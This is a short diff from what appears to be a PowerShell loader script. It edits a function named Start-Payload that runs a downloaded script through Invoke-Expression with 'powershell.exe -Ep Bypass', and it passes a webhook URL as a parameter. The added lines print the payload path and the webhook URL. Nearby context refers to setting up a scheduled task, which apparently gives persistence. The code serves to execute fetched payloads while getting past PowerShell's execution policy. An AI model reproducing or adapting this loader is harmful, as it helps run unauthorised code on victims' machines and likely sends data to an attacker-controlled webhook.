@@ -39,7 +39,9 @@ function Set-ScheduledTask {
 # Create a function to run the downloaded script
 function Start-Payload {
     try {
-        $command = "powershell.exe -Ep Bypass -dc `"$dc`" -File `"$destino`""
+        Write-Output "Executing payload $destino"
+        Write-Output "Webhook URL: $dc"
+        $command = "powershell.exe -Ep Bypass -dc $dc -File $destino"
         Invoke-Expression $command
         Write-Output "Script executed successfully"
     }
